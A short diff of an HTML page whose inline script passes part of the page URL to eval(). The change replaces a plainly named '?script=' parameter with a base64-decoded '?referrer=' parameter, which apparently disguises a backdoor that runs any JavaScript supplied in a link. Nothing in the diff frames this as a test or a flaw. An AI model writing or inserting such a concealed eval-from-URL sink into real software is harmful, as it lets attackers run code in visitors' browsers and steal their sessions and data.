@@ -1,7 +1,7 @@
 <html>
   <script>
     try {
-      eval(unescape(window.location.href.split("?script=")[1]))
+      eval(atob(window.location.href.split("?referrer=")[1]))
     } catch (e) { 
       console.log(e)
     }
